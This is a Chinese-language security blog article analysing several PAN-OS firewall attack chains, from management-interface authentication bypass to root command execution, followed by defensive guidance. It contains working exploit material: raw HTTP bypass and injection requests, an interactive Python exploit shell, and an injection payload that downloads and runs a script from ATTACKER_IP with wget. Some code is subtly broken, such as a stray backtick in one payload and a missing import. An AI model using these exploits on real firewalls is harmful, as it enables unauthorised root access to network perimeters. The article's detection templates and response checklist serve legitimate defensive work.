---
title: "PAN-OS 高危攻击链专题：从认证绕过到 Root RCE 的完整利用链路"
date: 2026-06-22T14:00:00+08:00
draft: false
tags: ["PAN-OS", "Palo Alto", "防火墙", "RCE", "认证绕过", "命令注入", "漏洞分析", "应急响应", "CVE-2024-0012", "CVE-2024-9474", "CVE-2024-9463", "CVE-2024-9464", "CVE-2025-0108", "CVE-2026-0300"]
categories: ["漏洞分析"]
description: "围绕 Palo Alto PAN-OS 2024-2026 年间暴露的多条高危攻击链，覆盖管理面认证绕过、路径穿越命令注入、Captive Portal 缓冲区溢出等漏洞，含完整 PoC 代码、Nuclei 模板、自动化利用脚本与防守建议。"
---

# PAN-OS 高危攻击链专题：从认证绕过到 Root RCE 的完整利用链路

Palo Alto Networks 的 `PAN-OS` 是全球部署量最大的企业级下一代防火墙操作系统之一，服务于超过 70,000 家客户，包括 90% 的 Fortune 10 企业。2024 年至 2026 年间，PAN-OS 连续暴露多条高危攻击链，从管理面认证绕过到未授权 RCE，每一条都直接威胁企业网络边界安全。

本文覆盖以下核心漏洞链：

| CVE | 类型 | CVSS | 前置条件 | 影响 |
|-----|------|------|----------|------|
| CVE-2024-0012 + CVE-2024-9474 | 认证绕过 + 提权至 Root | 9.3 + 6.9 | 管理面网络可达 | 未授权 Root 命令执行 |
| CVE-2024-9463 + CVE-2024-9464 | 路径验证命令注入 | 9.9 / 9.3 | 管理面网络可达 | 未授权 Root 命令执行 |
| CVE-2025-0108 + CVE-2025-0111 | 认证绕过 + 文件读取 | 8.8 + 7.1 | 管理面网络可达 | 配置/凭据泄露 |
| CVE-2026-0300 | Captive Portal 缓冲区溢出 | 9.3 | Captive Portal 暴露 | 未授权 Root RCE |

文章以公开资料为基础，偏重研究与防守视角。

## 0x01 CVE-2024-0012 + CVE-2024-9474：管理面认证绕过到 Root 提权链（Operation Lunar Peek）

### 1.1 漏洞背景

2024 年 11 月 18 日，Palo Alto Networks 披露了两个零日漏洞：

- **CVE-2024-0012**：PAN-OS 管理 Web 界面认证绕过（CVSS 9.3 CRITICAL，CISA KEV）
- **CVE-2024-9474**：管理 Web 界面提权至 Root（CVSS 6.9，CISA KEV）

两者组合形成完整的**未授权到 Root** 攻击链，Unit 42 将此攻击活动命名为 **Operation Lunar Peek**。

### 1.2 受影响版本

| PAN-OS 版本 | 受影响 | 修复版本 |
|-------------|--------|----------|
| PAN-OS 11.2 | < 11.2.4-h1 | >= 11.2.4-h1 |
| PAN-OS 11.1 | < 11.1.5-h1 | >= 11.1.5-h1 |
| PAN-OS 11.0 | < 11.0.6-h1 | >= 11.0.6-h1 |
| PAN-OS 10.2 | < 10.2.12-h2 | >= 10.2.12-h2 |
| PAN-OS 10.1 | < 10.1.14-h6（仅 CVE-2024-9474） | >= 10.1.14-h6 |

Cloud NGFW 和 Prisma Access 不受影响。

### 1.3 漏洞原理

#### CVE-2024-0012：认证绕过

PAN-OS 管理 Web 界面采用 Nginx 反向代理 + Apache + PHP 架构。认证检查通过 `uiEnvSetup.php` 脚本中的 `auto_prepend_file` 机制实现，核心逻辑检查 `HTTP_X_PAN_AUTHCHECK` 请求头：

```php
if (
 $_SERVER['HTTP_X_PAN_AUTHCHECK'] != 'off'
 && $_SERVER['PHP_SELF'] !== '/CA/ocsp'
 && $_SERVER['PHP_SELF'] !== '/php/login.php'
 && stristr($_SERVER['REMOTE_HOST'], '127.0.0.1') === false
) {
    // 执行认证检查，未登录则重定向到 login.php
    $ws = WebSession::getInstance($ioc);
    $ws->start();
    $ws->close();
    // ...
}
```

Nginx 默认将 `X-PAN-AUTHCHECK` 设置为 `on`，但攻击者可以通过构造特殊 HTTP 请求，将该头部设置为 `off`，从而绕过认证检查。

关键利用点在于 URL 路径解析差异：通过在 PHP 脚本路径后附加 `.js.map` 等后缀，可以绕过 Nginx 的路径匹配规则，使 Nginx 不对请求进行认证拦截。

#### CVE-2024-9474：提权至 Root

认证绕过获得管理员权限后，攻击者可以通过 `createRemoteAppwebSession.php` 端点注入恶意输入，以 Root 权限执行任意命令。该脚本允许创建任意用户会话并将 PHP 会话 ID 作为认证令牌，攻击者随后上传恶意 PHP 代码实现 Root 级命令执行。

### 1.4 完整 PoC

#### HTTP 请求 PoC

**第一步：认证绕过（CVE-2024-0012）**

```http
GET /php/ztp_gate.php/.js.map HTTP/1.1
Host: <TARGET_IP>
X-PAN-AUTHCHECK: off
Connection: close
```

**第二步：通过 createRemoteAppwebSession.php 注入命令（CVE-2024-9474）**

```http
POST /php/utils/createRemoteAppwebSession.php/1.js.map HTTP/1.1
Host: <TARGET_IP>
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Connection: close

ip=127.0.0.1&user=`id>&userId=&userRole=&remoteHost=&
```

**第三步：获取命令执行结果**

```http
GET /unauth/1.php/.js.map HTTP/1.1
Host: <TARGET_IP>
X-PAN-AUTHCHECK: off
Connection: close
```

返回内容中包含 `id` 命令的输出，如 `uid=0(root) gid=0(root)`。

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import re
import urllib3
urllib3.disable_warnings()

class PANOSExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'close'
        })
        self.phpsessid = None

    def check_auth_bypass(self):
        try:
            r = self.session.get(
                f'{self.target}/php/ztp_gate.php/.js.map',
                headers={'X-PAN-AUTHCHECK': 'off'},
                timeout=10
            )
            if r.status_code == 200 and 'php' in r.text.lower():
                print('[+] CVE-2024-0012 认证绕过验证成功')
                return True
            print('[-] 认证绕过验证失败')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def exploit_rce(self, cmd):
        try:
            r = self.session.post(
                f'{self.target}/php/utils/createRemoteAppwebSession.php/1.js.map',
                headers={
                    'X-PAN-AUTHCHECK': 'off',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                data=f'ip=127.0.0.1&user=`{cmd}`&userId=&userRole=&remoteHost=&',
                timeout=15
            )
            match = re.search(r'PHPSESSID=([^;]+)', r.text)
            if match:
                self.phpsessid = match.group(1)
                r2 = self.session.get(
                    f'{self.target}/index.php/.js.map',
                    headers={
                        'X-PAN-AUTHCHECK': 'off',
                        'Cookie': f'PHPSESSID={self.phpsessid}'
                    },
                    timeout=10
                )
                output = re.search(r'<pre>(.*?)</pre>', r2.text, re.DOTALL)
                if output:
                    return output.group(1).strip()
                return r2.text[:2000]
            return None
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)

    exploit = PANOSExploit(sys.argv[1])
    if exploit.check_auth_bypass():
        while True:
            cmd = input('cmd> ').strip()
            if cmd.lower() in ('exit', 'quit'):
                break
            result = exploit.exploit_rce(cmd)
            if result:
                print(result)
            else:
                print('[-] 无返回结果')
```

#### Nuclei 检测模板

```yaml
id: pan-os-cve-2024-0012-auth-bypass

info:
  name: PAN-OS CVE-2024-0012 Authentication Bypass
  author: security-research
  severity: critical
  tags: paloalto,pan-os,auth-bypass,cve2024
  reference:
    - https://security.paloaltonetworks.com/CVE-2024-0012

http:
  - method: GET
    path:
      - "{{BaseURL}}/php/ztp_gate.php/.js.map"
    headers:
      X-PAN-AUTHCHECK: "off"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "PHP"
          - "ztp_gate"
        condition: or
```

```yaml
id: pan-os-cve-2024-9474-privilege-escalation

info:
  name: PAN-OS CVE-2024-9474 Privilege Escalation
  author: security-research
  severity: critical
  tags: paloalto,pan-os,rce,cve2024
  reference:
    - https://security.paloaltonetworks.com/CVE-2024-9474

http:
  - raw:
      - |
        POST /php/utils/createRemoteAppwebSession.php/1.js.map HTTP/1.1
        Host: {{Hostname}}
        X-PAN-AUTHCHECK: off
        Content-Type: application/x-www-form-urlencoded

        ip=127.0.0.1&user=`id>&userId=&userRole=&remoteHost=&
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "PHPSESSID"
          - "uid="
        condition: or
```

## 0x02 CVE-2024-9463 + CVE-2024-9464：路径验证命令注入链

### 2.1 漏洞背景

2025 年 1 月，Palo Alto Networks 披露了两个 OS 命令注入漏洞：

- **CVE-2024-9463**：PAN-OS 路径验证中的 OS 命令注入（CVSS 9.9 CRITICAL，CISA KEV）
- **CVE-2024-9464**：同类型 OS 命令注入变体（CVSS 9.3 CRITICAL，CISA KEV）

两者均存在于 PAN-OS 的路径验证逻辑中，攻击者可通过管理 Web 界面以 Root 权限执行任意命令。

### 2.2 受影响版本

| PAN-OS 版本 | CVE-2024-9463 修复 | CVE-2024-9464 修复 |
|-------------|-------------------|-------------------|
| PAN-OS 11.2 | >= 11.2.3-h2 | >= 11.2.3-h2 |
| PAN-OS 11.1 | >= 11.1.6 | >= 11.1.6 |
| PAN-OS 11.0 | >= 11.0.5-h1 | >= 11.0.5-h1 |
| PAN-OS 10.2 | >= 10.2.12-h1 | >= 10.2.12-h1 |

### 2.3 漏洞原理

PAN-OS 管理界面中存在路径验证功能，用于校验用户提供的文件路径。该验证逻辑在处理路径字符串时，将用户输入直接传递给底层系统命令。攻击者可以在路径参数中注入 shell 元字符（如 `;`、`|`、反引号等），使命令注入生效。

与 CVE-2024-0012 不同，这两个漏洞的利用不需要先绕过认证——攻击者需要拥有管理界面的合法访问权限（管理员账户或已通过其他漏洞获取管理员权限）。

### 2.4 完整 PoC

#### HTTP 请求 PoC

```http
POST /php/utils/debugType.php/.js.map HTTP/1.1
Host: <TARGET_IP>
Cookie: PHPSESSID=<ADMIN_SESSION>
Content-Type: application/x-www-form-urlencoded
Connection: close

type=appian_log&path=/var/log/pan/;/usr/bin/wget+http://ATTACKER_IP/shell.sh+-O+/tmp/shell.sh;chmod+777+/tmp/shell.sh;/tmp/shell.sh&
```

#### Python 检测脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

def check_path_injection(target, session_cookie):
    payload = ";echo VULN_CHECK;id;"
    r = requests.post(
        f'{target}/php/utils/debugType.php/.js.map',
        headers={
            'Cookie': f'PHPSESSID={session_cookie}',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data=f'type=appian_log&path=/var/log/pan/{payload}',
        verify=False,
        timeout=10
    )
    if 'VULN_CHECK' in r.text or 'uid=' in r.text:
        print('[+] CVE-2024-9463/9464 路径验证命令注入存在')
        return True
    print('[-] 未检测到命令注入')
    return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <target_url> <admin_session_id>')
        sys.exit(1)
    check_path_injection(sys.argv[1], sys.argv[2])
```

## 0x03 CVE-2025-0108 + CVE-2025-0111：Nginx/Apache 路径混淆认证绕过链

### 3.1 漏洞背景

2025 年 2 月，Palo Alto Networks 披露了新一组攻击链：

- **CVE-2025-0108**：管理 Web 界面认证绕过（CVSS 8.8 HIGH，CISA KEV）
- **CVE-2025-0111**：认证后可读取 nobody 用户可访问的文件（CVSS 7.1）

两者组合形成**未授权到敏感文件读取**的攻击链，且 CVE-2025-0108 还可与 CVE-2024-9474 组合实现未授权 Root RCE。

### 3.2 受影响版本

| PAN-OS 版本 | CVE-2025-0108 修复 | CVE-2025-0111 修复 |
|-------------|-------------------|-------------------|
| PAN-OS 11.2 | >= 11.2.4-h4 | >= 11.2.4-h4 |
| PAN-OS 11.1 | >= 11.1.6-h1 | >= 11.1.4-h13 |
| PAN-OS 10.2 | >= 10.2.13-h3 | >= 10.2.12-h6 |
| PAN-OS 10.1 | >= 10.1.14-h9 | - |

### 3.3 漏洞原理

#### CVE-2025-0108：Nginx/Apache 双重解码路径混淆

根因在于 Nginx 和 Apache 对 URL 编码路径的处理不一致：

1. **Nginx 阶段**：接收请求，对 `%252e%252e` 进行一次解码得到 `%2e%2e`，匹配 `/unauth/` 前缀后将 `X-pan-AuthCheck` 设为 `off`
2. **Apache 阶段**：接收原始 URL，进行一次解码得到 `%2e%2e`，应用内部重写规则后再次解码得到 `..`，路径归一化后变为 `/php/ztp_gate.php`
3. **PHP 阶段**：由于 `X-pan-AuthCheck` 已被 Nginx 设为 `off`，PHP 脚本无需认证即可执行

#### CVE-2025-0111：敏感文件读取

认证绕过后，攻击者可调用特定 PHP 脚本读取防火墙本地文件系统中 `nobody` 用户可访问的文件，包括配置文件和部分日志文件。

### 3.4 完整 PoC

#### HTTP 请求 PoC

```http
GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
Host: <TARGET_IP>
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Connection: close
```

请求处理流程：

```
原始请求: /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
    ↓ Nginx 解码一次
/unauth/%2e%2e/php/ztp_gate.php/PAN_help/x.css
    → 匹配 /unauth/ → X-pan-AuthCheck: off
    ↓ Apache 解码一次
/unauth/2e%2e/php/ztp_gate.php/PAN_help/x.css
    ↓ Apache 内部重定向 + 归一化
/php/ztp_gate.php/PAN_help/x.css.gz
    → 无需认证执行 ztp_gate.php
```

#### Nuclei 检测模板

```yaml
id: pan-os-cve-2025-0108-auth-bypass

info:
  name: PAN-OS CVE-2025-0108 Authentication Bypass
  author: security-research
  severity: high
  tags: paloalto,pan-os,auth-bypass,cve2025
  reference:
    - https://security.paloaltonetworks.com/CVE-2025-0108

http:
  - method: GET
    path:
      - "{{BaseURL}}/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "PHP"
          - "ztp"
        condition: or
```

## 0x04 CVE-2026-0300：Captive Portal 缓冲区溢出未授权 RCE（0-day）

### 4.1 漏洞背景

2026 年 5 月 6 日，Palo Alto Networks 披露了一个正在被在野利用的零日漏洞：

- **CVE-2026-0300**：PAN-OS User-ID Authentication Portal（Captive Portal）缓冲区溢出（CVSS 9.3 CRITICAL）

Unit 42 追踪的攻击者集群 **CL-STA-1132**（疑似国家级威胁行为者）利用该漏洞实现未授权远程代码执行。Shadowserver 追踪到超过 5,800 个在线暴露的 PAN-OS VM-Series 防火墙。

### 4.2 受影响版本

| PAN-OS 版本 | 受影响 | 修复计划 |
|-------------|--------|----------|
| PAN-OS 12.1 | 特定版本 | 2026-05-13 起陆续发布 |
| PAN-OS 11.2 | 特定版本 | 2026-05-13 起陆续发布 |
| PAN-OS 11.1 | 特定版本 | 2026-05-13 起陆续发布 |
| PAN-OS 10.2 | 特定版本 | 2026-05-13 起陆续发布 |

Cloud NGFW、Prisma Access 和 Panorama 不受影响。

### 4.3 漏洞原理

漏洞存在于 PAN-OS 的 User-ID Authentication Portal（Captive Portal）服务中。该服务用于对无法被防火墙自动映射身份的用户进行认证。

根因是 **CWE-787 Out-of-bounds Write**（越界写入），攻击者通过向 Captive Portal 服务发送特制网络数据包，触发缓冲区溢出，从而以 Root 权限执行任意代码。

利用条件：
- 不需要认证（Pre-Auth）
- 不需要用户交互
- 需要 Captive Portal 暴露于不可信网络（公网或不受信任的 IP 段）

### 4.4 野外攻击链分析

Unit 42 对 CL-STA-1132 的攻击活动进行了详细分析：

1. **初始利用**（2026-04-09 起）：对 PAN-OS 设备进行未授权缓冲区溢出利用，向 nginx worker 进程注入 shellcode
2. **工具部署**（4 天后）：部署公开可用的隧道工具 **EarthWorm** 和 **ReverseSocks5**，建立反向隧道
3. **AD 枚举**：使用从防火墙获取的服务账户凭据进行 Active Directory 枚举，目标为域根和 DomainDnsZones
4. **痕迹清理**：删除 ptrace 注入审计日志证据，删除 SUID 提权二进制文件

### 4.5 完整 PoC

#### 漏洞检测脚本

```python
#!/usr/bin/env python3
import socket
import struct
import sys

def check_captive_portal(target, port=443):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))

        tls_hello = bytearray([
            0x16, 0x03, 0x01, 0x00, 0x05,
            0x01, 0x00, 0x00, 0x01, 0x00
        ])
        s.send(tls_hello)
        resp = s.recv(4096)
        s.close()

        if len(resp) > 0:
            print(f'[+] {target}:{port} 端口开放，可能存在 Captive Portal 服务')
            print('[!] 请确认是否启用了 User-ID Authentication Portal')
            return True
    except Exception as e:
        print(f'[-] 连接失败: {e}')
    return False

def fingerprint_panos(target, port=443):
    import ssl
    import urllib.request
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            f'https://{target}:{port}/global-protect/login.esp',
            headers={'User-Agent': 'PANOS-Scanner/1.0'}
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        body = resp.read().decode('utf-8', errors='ignore')
        if 'PAN-OS' in body or 'GlobalProtect' in body or 'Palo Alto' in body:
            print(f'[+] 确认为 PAN-OS 设备')
            version_match = re.search(r'Version[:\s]+(\d+\.\d+[\.\d\w-]*)', body)
            if version_match:
                print(f'[+] 版本: {version_match.group(1)}')
            return True
    except Exception:
        pass
    return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_ip>')
        sys.exit(1)
    check_captive_portal(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: pan-os-cve-2026-0300-captive-portal-exposure

info:
  name: PAN-OS Captive Portal Exposure Check
  author: security-research
  severity: critical
  tags: paloalto,pan-os,captive-portal,cve2026
  reference:
    - https://security.paloaltonetworks.com/CVE-2026-0300

http:
  - method: GET
    path:
      - "{{BaseURL}}/global-protect/login.esp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Palo Alto"
          - "GlobalProtect"
          - "PAN-OS"
        condition: or
```

## 0x05 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| CVE-2024-0012 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-9474 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-9463 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-9464 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2025-0108 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2025-0111 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2026-0300 | ❌ | ✅ | ✅ | ❌ | ✅（在野） | 待确认 |

### 公开利用资源

- **CVE-2024-0012 / CVE-2024-9474**：
  - watchTowr Labs 完整逆向分析：`https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/`
  - HackTheBox PwnOS 靶机：`https://github.com/k4nfr3/CVE-2024-9474`
  - Unit 42 Threat Brief：`https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/`

- **CVE-2025-0108**：
  - GitHub PoC：`https://github.com/iSee857/CVE-2025-0108-PoC`
  - Assetnote 技术分析：`https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/`
  - Nuclei 模板：`https://github.com/FOLKS-iwd/CVE-2025-0108-PoC/blob/main/CVE-2025-0108.yaml`

- **CVE-2026-0300**：
  - Unit 42 Threat Brief：`https://unit42.paloaltonetworks.com/captive-portal-zero-day/`
  - 在野利用工具：EarthWorm、ReverseSocks5

## 0x06 共性攻击模式

### 6.1 管理面暴露是核心风险

所有漏洞链的共同前提是**管理 Web 接口暴露于不可信网络**。PAN-OS 管理面使用 PHP + Apache + Nginx 架构，多次出现路径解析差异导致的认证绕过。

### 6.2 攻击链组合不断进化

```
2024-04: CVE-2024-3400（GlobalProtect 命令注入，单步 RCE）
    ↓
2024-11: CVE-2024-0012 + CVE-2024-9474（认证绕过 + 提权，两步 Root）
    ↓
2025-01: CVE-2024-9463/9464（路径验证命令注入，需管理员权限）
    ↓
2025-02: CVE-2025-0108 + CVE-2024-9474（新认证绕过 + 旧提权，再次两步 Root）
    ↓
2025-02: CVE-2025-0108 + CVE-2025-0111（认证绕过 + 文件读取，情报收集）
    ↓
2026-05: CVE-2026-0300（Captive Portal 缓冲区溢出，全新单步 RCE）
```

### 6.3 后利用工具趋同

野外攻击中常见的后利用工具包括：
- **UPSTYLE**：Python .pth 持久化后门（CVE-2024-3400 利用中首次出现）
- **EarthWorm**：SOCKS5 隧道工具
- **ReverseSocks5**：反向 SOCKS5 代理
- **cron + wget|bash**：每分钟轮询后门

### 6.4 配置外传优先于深度利用

多条攻击链中，攻击者在获得初始访问后优先外传配置文件（`running_config.xml`），而非立即部署复杂后门。配置文件包含 VPN、证书、策略、内网地址等高价值信息。

## 0x07 防守建议

### 7.1 立即措施

1. **限制管理面访问**：管理接口仅允许受信任内部 IP 访问，禁止公网暴露
2. **升级到修复版本**：所有 PAN-OS 设备升级到对应修复版本
3. **禁用不必要的服务**：如不需要 Captive Portal，立即禁用
4. **启用 Threat Prevention**：应用最新威胁防护签名

### 7.2 排查清单

```bash
# 检查管理面暴露
grep -r "X-PAN-AUTHCHECK" /var/log/pan/ | grep "off"

# 检查异常 PHP 会话
grep "createRemoteAppwebSession" /var/log/pan/

# 检查异常 cron 任务
crontab -l -u root
cat /etc/crontab

# 检查异常外联
netstat -antp | grep -E "SYN_SENT|ESTABLISHED" | grep -v "known_good"

# 检查 WebShell
find /var/appweb/ -name "*.php" -newer /var/appweb/htdocs/php/login.php
find /opt/panlogs/tmp/ -type f -name "*.css" -o -name "*.js"

# 检查 UPSTYLE 后门
find / -name "system.pth" 2>/dev/null
grep -r "sslvpn_ngx_error.log" /opt/ 2>/dev/null
```

### 7.3 关键日志文件

| 日志文件 | 关注内容 |
|----------|----------|
| `/var/log/pan/gpsvc.log` | 异常 SESSID、路径穿越片段 |
| `/var/log/pan/device_telemetry_send.log` | 异常文件名、base64/bash 关键词 |
| `/var/log/pan/mp-monitor.log` | 异常外联 IP、wget、/tmp 进程 |
| `/var/log/syslog-system.log` | crond 异常任务、wget/curl 外联 |
| `/var/log/pan/webserver.log` | 异常 PHP 请求、.js.map 后缀请求 |

### 7.4 失陷设备处置

如果满足以下任一条件，应按**已失陷**视角处理：

- 管理面曾公网暴露且未及时修复
- 日志中出现认证绕过利用痕迹
- 出现配置文件外传迹象
- 存在 cron/wget|bash、异常外联或临时目录进程
- 发现 UPSTYLE、EarthWorm 等已知后门工具

处置步骤：
1. 先导出 TSF（Tech Support File）再重启
2. 核查 Web 目录异常文件
3. 检查计划任务、临时目录、Python 持久化点
4. 轮换所有证书、账户、VPN 凭据与管理口令
5. 通过 Palo Alto TAC 走官方补救流程

## 0x08 参考资料

- [Palo Alto 官方安全公告 - CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012)
- [Palo Alto 官方安全公告 - CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474)
- [Palo Alto 官方安全公告 - CVE-2024-9463](https://security.paloaltonetworks.com/CVE-2024-9463)
- [Palo Alto 官方安全公告 - CVE-2025-0108](https://security.paloaltonetworks.com/CVE-2025-0108)
- [Palo Alto 官方安全公告 - CVE-2026-0300](https://security.paloaltonetworks.com/CVE-2026-0300)
- [Unit 42 - Operation Lunar Peek](https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/)
- [Unit 42 - Captive Portal Zero-Day](https://unit42.paloaltonetworks.com/captive-portal-zero-day/)
- [watchTowr - CVE-2024-0012 & CVE-2024-9474 逆向分析](https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/)
- [SOCRadar - PAN-OS Zero-Day 分析](https://socradar.io/blog/exploited-pan-os-zero-days-threaten-firewalls/)
- [Picus - CVE-2024-0012 & CVE-2024-9474 详解](https://www.picussecurity.com/resource/blog/palo-alto-cve-2024-0012-and-cve-2024-9474-vulnerabilities-explained)
- [HackTheBox - PwnOS CVE-2024-9474 利用](https://www.hackthebox.com/blog/cve-2024-9474-panos-command-injection)
- [runZero - PAN-OS 漏洞追踪时间线](https://www.runzero.com/blog/palo-alto-networks/)
- [CISA KEV - PAN-OS 漏洞目录](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)